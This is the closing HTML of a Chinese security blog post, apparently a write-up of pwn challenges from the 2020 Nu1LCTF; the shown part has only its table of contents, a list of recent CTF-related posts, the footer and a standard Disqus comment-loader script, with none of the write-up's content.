is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signup"><span class="toc-text">Signup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyWrite"><span class="toc-text">EasyWrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kemu"><span class="toc-text">kemu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#W2L"><span class="toc-text">W2L</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AFKASLR"><span class="toc-text">未开启KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1"><span class="toc-text">exp1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2"><span class="toc-text">exp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFKALSR"><span class="toc-text">开启KALSR</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/2291042632.html'
    this.page.identifier = 'posts/2291042632.html'
    this.page.title = '2020 Nu1LCTF 部分PWN WriteUp'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>